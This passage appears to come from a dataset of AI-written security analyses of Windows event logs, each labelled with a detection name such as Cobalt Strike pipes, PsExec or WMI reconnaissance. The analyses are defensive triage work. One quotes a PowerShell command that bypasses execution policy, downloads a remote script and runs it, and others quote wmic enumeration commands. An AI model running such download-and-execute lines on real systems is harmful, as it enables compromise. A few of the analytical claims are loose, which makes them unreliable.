   - Isolate the affected machine (Server002) from the network to prevent any potential lateral movement.
   - Perform a comprehensive antivirus and EDR scan to confirm and remove any possible threat on the machine.

2. **Forensic Investigation:**
   - Review any downloaded files (`qbot-test.iso`, `calc.exe.lnk`) to understand their contents and potential impact.
   - Check for any other systems on the network that may have executed similar activities.

3. **Future Mitigation:**
   - Implement stricter PowerShell script monitoring and controls.
   - Regularly update antivirus definitions and conduct threat hunting to identify unusual behaviors promptly.

Taking these steps will help mitigate the immediate risk and prevent similar occurrences in the future."
Cobalt Strike Artifact Kit pipe,"### Analysis of the Logs

Upon reviewing the provided event logs, there are several notable observations:

1. **Unusual Process Executions:**
   - There are multiple executions of `conhost.exe` and `wevtutil.exe` under the `admin_test` user on `Server002`, captured in several Sysmon logs. While these are legitimate Windows processes, frequent creation, especially by a non-system user account, can sometimes suggest attempts at log tampering (with `wevtutil.exe`) or process creation under unusual contexts (with `conhost.exe`).

2. **Privilege Escalation:**
   - Event ID 4672 indicates the granting of high-level privileges (e.g., `SeDebugPrivilege`) to the `SYSTEM` account shortly after several successful logons and credentials-related events, which is normal behavior for the `SYSTEM` account during certain operations, although attention should still be paid if these were unexpected or if the context seems suspicious.

3. **Credential Events:**
   - Numerous Event ID 5379 (Credential Validation Request) logs are evident, which indicate attempts to access credentials for a user `02txoixylodcstop`. The return code 3221226021 suggests these attempts did not succeed, which may imply unsuccessful attempts at accessing certain credential stores repeatedly.

4. **Potential Malware Indicators:**
   - The process `namedpipes_executor.exe` and its related named pipes activities from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\`) are suspect. This is often indicative of malware or unauthorized third-party tools using inter-process communication channels, which is not typical behavior for legitimate sysadmin utilities.

5. **Logon and Process Creation Patterns:**
   - System account logons (Event ID 4624) are frequent and seem typical. However, these should be correlated with expected task schedules and administrative activities to rule any suspicious activities out.
   - Various legitimate processes like `CompatTelRunner.exe` are seen, but no anomalous command-line arguments suggest malicious abuse.

### Assessment

Based on the events analyzed:

- **Frequent Use of Admin Account ""admin_test"":** This account is executing commands with potentially powerful utilities (`wevtutil.exe`, `powershell.exe`), often associated with administrative or scripting activities. The context of these activities against defined baseline activity is crucial to interpret their intent.
  
- **Named Pipes Execution from Temp Directory:** This is the strongest anomaly noted, suggesting potential misuse or malicious activities exploiting inter-process communications.

- **Credential Access Issues:** Multiple failed credential access attempts could hint at a brute-force or enumeration attempt, though not successful.

### Resolution

The resolution leans towards **SUSPICIOUS**. While there are indicators that require further investigation, such as unexpected activities from `namedpipes_executor.exe`, these are not definitively malicious in the provided context. There is no single clear indicator of compromise at a full conviction level, but the combination of events suggests potential malicious probing activities, particularly the named pipes execution, which requires deeper inspection into those specific processes and their origins.

### Guidance

- **Immediate Actions:**
  - Investigate the `namedpipes_executor.exe` processes to understand their origin and link to `admin_test`.
  - Review the activities of the `admin_test` account around the timestamps of these events.
  - Ensure all software and system patches are up-to-date to mitigate exploitation of known vulnerabilities.

- **Long-term Actions:**
  - Implement enhanced logging and monitoring for process executions, especially those invoked by high-privileged user accounts.
  - Review and possibly tighten policies around temporary directories and process spawning from unrecognized binaries.
  - Use threat intelligence to correlate these events with known malicious TTPs."
Pipe Creation - PsExec Tool Execution From Suspicious Locations,"Upon reviewing the logs provided, several indicators suggest that there may be suspicious or potentially malicious activity occurring on the system:

1. **Presence of PsExec**: 
   - The System log indicates the installation of `PSEXESVC` on October 28, 2024, at 14:55:22. This service is associated with the PsExec utility by Sysinternals, commonly used for executing processes remotely. While a legit tool, PsExec is frequently used by attackers for lateral movement due to its ability to execute commands with high privileges.

2. **Suspicious PowerShell Commands**:
   - In the Windows PowerShell logs, there is a pattern of executing scripts stored in `C:\\Users\\Public\\Temp\\`. Also, PowerShell commands such as `script.exe -i -s cmd -accepteula` are executed, which could indicate attempts to run scripts or escalate privileges.
   - The setting of PowerShell execution policy to ""Restricted"" is generally a default setting but should be monitored for any signs of bypass or unusual scripts being executed.

3. **Elevated Privileges**:
   - The Security log shows multiple instances of Event ID 4672, indicating that a user `admin_test` was granted special privileges including `SeDebugPrivilege`, which is often used for advanced rights that allow extensive access to system resources and potentially shallow defenses.
   - The frequent logging on and off by admin_test along with high privileges might point to potential misuse or compromise of this account.

4. **System Process Executions**:
   - The Sysmon log indicates numerous process creations initiated by possibly suspicious parent processes such as `WindowsPowerShell` and `script.exe` which may not correspond to regular operational requirements.
   - Commands involving the execution of scripts, likely stored at a public accessible location, are often a sign of initial foothold or preparation for a broader attack.

5. **Network Connections**:
   - There are examples of Logon events (Event ID 4624) with NTLM authentication from a remote address, which might be legitimate; however, if unexpected, it could also indicate an ongoing attack involving credential abuse or unauthorized access attempts.

**Assessment**:
The combination of these events suggests a coordinated effort that aligns closer with malicious activity rather than benign administrative tasks. The use of PsExec, PowerShell scripts, and elevated privileges, along with network authentication using NTLM, could indicate tools and tactics typically used in lateral movement and credential abuse within a network.

**Resolution: MALICIOUS**

**Guidance**:
- Immediate action is recommended to contain the potential breach:
  1. **Investigate and Isolate**: Immediately investigate the user account `admin_test` and isolate the machine `Server002`.
  2. **Review Access Logs**: Check network access logs for any unauthorized entries or external connections, especially those involving NTLM authentication.
  3. **Audit PowerShell Usage**: Review scripts executed via PowerShell and disable unnecessary execution policies to prevent further abuse.
  4. **Remove Unauthorized Tools**: Remove or disable any Sysinternals PsExec installations that are not regularly accounted for in IT policies.
  5. **Credentials Check**: Ensure a change in credentials for any accounts that may have been exposed, especially those with elevated privileges.
  6. **In-depth Monitoring**: Implement tighter monitoring of administrative accounts and investigate any other anomalies in server behavior.

Ensuring robust monitoring, continuous review of security policies, and educating users on recognizing and reporting suspicious activity are key steps to mitigate the potential impact of similar threats."
Cobalt Strike post-exploitation pipe (4.2 and later),"In examining the provided event logs from the CEO's Windows machine, several events present characteristics commonly associated with potentially malicious activities. Let's delve into the analysis:

1. **Security log (Event ID 4672)**: 
   - The event indicates that the user ""admin_test"" was assigned special privileges, including ""SeDebugPrivilege"" and ""SeImpersonatePrivilege,"" which are powerful and often used in privilege escalation attacks. The presence of these privileges being assigned to a user, especially if not part of regular administrative tasks, is a red flag.

2. **Security log (Event ID 4624)**: 
    - This event logs a successful login with the NTLM protocol, suggesting the potential for pass-the-hash or NTLM relay attacks if this type of login is not usual for the user ""admin_test.""

3. **Sysmon log (Event ID 5 and 1)**: 
    - Multiple instances of `wevtutil.exe`, `cmd.exe`, and `powershell.exe` being executed by the user ""admin_test"" are observed. Notably, we see `wevtutil.exe` (Windows Event Utility) used, which can be employed to clear logs to cover tracks.
    - Activities involving `wevtutil.exe`, and `cmd.exe` executing a binary (`namedpipes_executor.exe`), raise significant concern. This binary, particularly observed with an unusual path in the temp directory, is not typical and suggests that the system might be compromised by malware or unauthorized presence.
    - The command-line activity of `cmd.exe` executing ""namedpipes_executor.exe"" alongside processes named `namedpipes_server.exe` and `namedpipes_client.exe` implies potential command and control (C2) or data exfiltration activities through named pipes, which is a technique used to maintain persistent access or communicate with malicious payloads.

4. **Anomalous and Suspicious Activities**:
    - Usage of utilities like `wevtutil.exe` and the execution of binaries from temporary directories are unusual behaviors for administrative accounts and indicate potential malicious activity.
    - The combined execution of processes such as `cmd.exe`, `powershell.exe`, and external unidentified executables (`namedpipes_executor.exe`) suggests post-exploitation activity.

5. **Indicators of Compromise (IoC)**:
    - The privilege assignment event suggests possible credential theft or a misconfiguration exploited by an attacker.
    - The presence of processes like `namedpipes_executor.exe` in the temporary directory and the repeated invocation of administrative utilities suggests escalation and data access attempts, possibly reflecting an attack pattern.

**Assessment**:
Based on this analysis, there are several suspicious activities observed in the logs, including anomalous usage of high-level privileges and execution of binaries from temporary paths hinting at a breach.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately isolate the affected machine to prevent lateral movement or further data exfiltration.
- Conduct a thorough forensic investigation, including memory analysis and examination of the file systems, to look for additional indicators of compromise.
- Review user account activity, especially for the ""admin_test"" user, and reset all potentially compromised credentials.
- Inspect and add more stringent monitoring for unusual privilege assignment logs and execution of suspicious binaries on the network.
- Implement additional security measures such as multi-factor authentication and endpoint detection and response (EDR) solutions to prevent future incidents."
WMI Reconnaissance List Remote Services,"Upon reviewing the provided Windows event logs, I have performed an analysis focusing on potential indicators of malicious activity, such as unusual process executions, command-line arguments, privilege escalations, and other signs of compromise.

**1. Time Synchronization:**
   - The security log events (EventID 4616) show frequent changes in system time. This can be a legitimate activity if there's a need to adjust time sync with an NTP server. However, inconsistency in timestamps or repeated changes could indicate an attempt to manipulate logs or cover tracks.
   - System logs indicate interaction with `time.windows.com` for time adjustments, which is typical for time synchronization.

**2. Use of NTLM Authentication:**
   - A successful logon (EventID 4624) using NTLM authentication shows a connection from `DESKTOP-3HL5B2P` to `SERVER002`. NTLM authentication without proper encryption can be vulnerable to attacks such as Pass-the-Hash. However, such activities can be normal if this method is standard in the environment.

**3. Privilege Escalation:**
   - The security log (EventID 4672) indicates that `admin_test` received special privileges including `SeDebugPrivilege`, which can be concerning if not typical for this user. This privilege allows a user to debug processes, which is usually unnecessary for standard operations and might be exploited for malicious purposes.

**4. Anomalous Process Executions:**
   - Sysmon logs show the execution of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `wmic.exe`. While these are legitimate Windows processes, their execution sequence and the user context `SERVER002\\admin_test` should be assessed to determine if they’re unusual.
   - The use of `wmic` especially with a query involving ""Spooler"" services (`wmic /node:""127.0.0.1"" service where (caption like ""%%Spooler%%"")`) can be suspicious. Attackers often ‘live off the land’ using built-in tools like WMIC for discovery or persistence.

**5. Administrative Tools Utilized:**
   - We see repeated use of `wevtutil`, which is used for manipulating event logs. Repeated execution might indicate attempts to exfiltrate or alter log data.

**Conclusion and Recommendation:**

- **Assessment:** SUSPICIOUS

Given the usage of administrative privileges, repeated time adjustments, and execution of sensitive command-line utilities, the activities noted are suspicious. While no direct evidence confirms outright malicious actions, the pattern suggests potential reconnaissance or preparatory steps for further attacks.

- **Guidance on How to Proceed:**
  - Verify whether the `admin_test` user account activities were legitimate. Cross-reference the tasks performed by this user with job responsibilities.
  - Check for any signs of file integrity violations or unauthorized access attempts.
  - Confirm that unusual time changes are not being utilized to adjust timestamps for malicious purposes.
  - Review network traffic and correlate it with these events to detect potential lateral movement or data exfiltration.
  - If not already done, consider using security solutions that offer additional layers of protection or anomaly detection.

Further investigation is needed to clarify these activities and, if necessary, implement mitigations to prevent any potential threats."
WMI Reconnaissance Users,"In reviewing the provided Windows event logs, there are several points of interest that may indicate suspicious activity:

1. **Privilege Escalation**:
   - The event with `EventID` 4672 indicates that the user ""admin_test"" has been granted a wide range of privileges, including `SeDebugPrivilege` and `SeLoadDriverPrivilege`, which are often indicative of potentially malicious activity, as these privileges can be exploited for privilege escalation or system compromise.

2. **Time Change Event**:
   - The logs show an event (`EventID` 4616) indicating a system time change. While not inherently malicious, time changes can be used to cover tracks or interfere with scheduled tasks and logs. The reason for this time change should be investigated further.

3. **Unusual Use of System Utilities**:
   - Multiple instances of `wevtutil.exe` and `wmic.exe` usage are logged. While these tools are built into Windows for legitimate purposes, they are commonly used by attackers for nefarious purposes such as querying or clearing event logs and system information gathering.

4. **Command Line Execution**:
   - The execution of `wmic useraccount get /ALL /format:csv` through `cmd.exe`, initiated by the user ""admin_test"", suggests an intention to enumerate user accounts on the system. This behavior is typical in reconnaissance phases of a cyber attack.

5. **Suspicious Logon Activity**:
   - There are multiple logons (`EventID` 4624 with `LogonType` 3) for the user ""admin_test"", which could indicate remote interactive logon activity. This might be suspicious especially in a high-value context such as the CEO’s machine, or if such behavior is atypical for the user.

6. **Process Executions**:
   - The process executions logged in the Sysmon logs, such as `hostname.exe`, `whoami.exe`, and instances of `conhost.exe`, accompanying other activities suggest an anomaly but not explicitly malicious without additional context.

Overall, the log entries present several red flags, particularly around potential privilege escalation, unusual account and command activity, and suspicious use of administration tools that align with known malicious behaviors.

**Assessment and Resolution**: 
While the activity captured in the logs is consistent with multiple known indicators of compromise (privilege use, reconnaissance commands, suspicious remote logon behavior), the evidence is not definitive enough to label this activity malicious beyond reasonable doubt without corroborating evidence. The activity is therefore classified as **SUSPICIOUS** and warrants further investigation to understand the context, such as verifying legitimate administrative tasks, changes in administrative procedures, or potential misuse of administrative accounts.

**Guidance on How to Proceed**:
- Verify if the `admin_test` user was conducting known legitimate activities during this time.
- Investigate further into the time change event to ascertain if it was authorized.
- Confirm the integrity of the system by examining other logs and security solutions for additional indicators of compromise.
- Review the system for signs of unauthorized access or data exfiltration.
- Consider implementing tighter monitoring and audit controls on high privilege accounts, and ensure that least privilege is enforced.

As part of a broader organizational check, it would be beneficial to have the security team assess the systems for potential vulnerabilities that could have been exploited, enrich this data with network event analysis, and cross-check with threat intelligence for known IOCs."
Command Prompt read contents from CMD file and execute,"**Analysis of Provided Windows Event Logs:**

1. **Process Execution:**
   - The logs show multiple executions of critical system processes such as `powershell.exe`, `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `calc.exe`, and `MicrosoftEdgeUpdate.exe`. It's common for system processes to execute, but the manner of their execution can indicate suspicious activities.

2. **Unusual Patterns:**
   - There is a high volume of command prompt executions (`cmd.exe`) within a short timeframe, with various command lines: `\""cmd.exe\"" /c cmd /r cmd`, `cmd /r cmd`, and `cmd.exe /c c:\\windows\\system32\\calc.exe`.
   - This is considered anomalous behavior and often used in illicit activities, such as executing multiple commands quickly to avoid detection or to execute unwanted scripts, which might suggest an attempt to mask activity or escalate privileges without being detected.

3. **Software Updates:**
   - Numerous instances of Edge Update processes (`MicrosoftEdgeUpdate.exe`) and related components such as `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` are running under `NT AUTHORITY\SYSTEM`. This could be a legitimate software update or installation mechanism. However, in some malicious scenarios, genuine processes can be leveraged to execute harmful tasks under the guise of legitimate operations.
   
4. **Privilege Levels:**
   - Several processes are executed with high integrity levels, which can potentially allow modification of system settings or installation of additional software without user consent.

5. **Parent Processes:**
   - The parent processes of several cmd.exe executions are traced back to `wsmprovhost.exe`, a legitimate Windows component. However, this context does not rule out the possibility of misuse or hijacking.

6. **Missing Contextual Information:**
   - The logs lack contextual command-line arguments for some processes, such as `powershell.exe`, which would typically be noticeable in malicious activity with specific scripts or payloads being executed.

**Assessment:**

Given the log analysis, the use of system processes in combination with a high volume of cmd executions with rapid succession and complex command-line arguments indicates unconventional activities that might not directly be identified as malicious but certainly worthy of further scrutiny.

**Resolution:** SUSPICIOUS

**Guidance:**

- **Immediate Actions:**
  - Investigate the rationale behind the sequence of `cmd.exe` executions. Review corresponding scripts or tasks triggered.
  - Review recent changes on the system, including new software installations or configurations.
  - Check for any unauthorized system configurations or accounts created around the time of the suspicious activities.

- **Further Investigation:**
  - Collect and analyze additional logs, such as network traffic and security logs, to confirm if any external connections or downloads correspond with the suspicious processes.
  - Perform threat hunting activities for indicators of compromise (IOC) on Server002.
  - Validate the integrity of the installed Microsoft Edge software, ensuring it corresponds to legitimate sources.

- **Preventive Measures:**
  - Strengthen endpoint monitoring capabilities to detect unusual process activities and unusual spikes in executions of high-integrity processes.
  - Consider implementing stricter execution policies and user access controls to prevent unauthorized execution of administrative tools."
Powershell MsXml COM object - with prompt,"Upon examining the provided Windows event logs from the CEO's machine, I have noted the following points of interest:

1. **Time Change Events**: The security and system logs contain events (EventID: 4616) that indicate changes to the system time. While changes to system time could be legitimate if performed due to configuration management or corrective action, they can also be indicative of attempts to manipulate timestamps in logs to cover tracks during malicious activity. The timings of these time adjustments, with svchost.exe involved, could suggest potentially suspicious behavior, but alone do not necessarily indicate malicious activity without further corroboration.

2. **Windows PowerShell Logs**: The PowerShell logs reveal activity with a command running PowerShell with the following suspicious command line: 
   ```
   powershell.exe -exec bypass -noprofile $comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/file/file-file/master/files/data.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText
   ```
   This command line downloads and executes a script directly from the internet using a PowerShell command with bypassed execution policy and without loading a user profile, which is a hallmark of potentially malicious PowerShell activity.

3. **Sysmon Logs**: The Sysmon logs detail command-line executions and process creation events that are consistent with the aforementioned PowerShell activity. Notably, the execution of `cmd.exe` with a similar command:
   ```
   ""cmd.exe"" /c powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/file/file-file/master/files/data.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText""
   ```
   indicates the use of cmd to launch PowerShell, possibly indicating an attempt to leverage multiple tools to evade detection.

**Assessment and Resolution:**

The combination of the suspicious PowerShell execution bypassing typical security mechanisms, directly downloading a script from an external URL, and changing system times suggests that there may indeed be malicious intent or an ongoing compromise attempt. These activities are characteristic of malicious behavior, such as exploitation or post-exploitation phases of an attack, where scripts are downloaded and run remotely. 

Given the significant indicators of compromise, the resolution for this analysis is:

- **MALICIOUS**: The logs contain activities that are highly indicative of malicious behavior, particularly the unauthorized execution of potentially harmful PowerShell scripts.

**Guidance on How to Proceed:**

1. **Immediate Containment**: Segregate the affected machine from the network to prevent any further command-and-control communication or data exfiltration.

2. **Further Investigation**: Perform a thorough forensic analysis of the system, focusing on identifying the origin of the malicious PowerShell script, potential persistence mechanisms, and extent of the compromise.

3. **Incident Response**: Trigger your incident response plan, including notifying stakeholders as appropriate and considering legal and regulatory obligations.

4. **Remediation**: Depending on the analysis, clean up or rebuild the affected system to ensure no malicious remnants remain and re-secure the machine in accordance with security policies.

5. **Review and Strengthening**: Examine the security posture, improve monitoring and detection capabilities, specifically around PowerShell usage and execution policy configurations. Implement stricter controls on direct script execution from external sources.

By taking these steps, you help ensure both a faster recovery from the incident and improved defense against future threats."
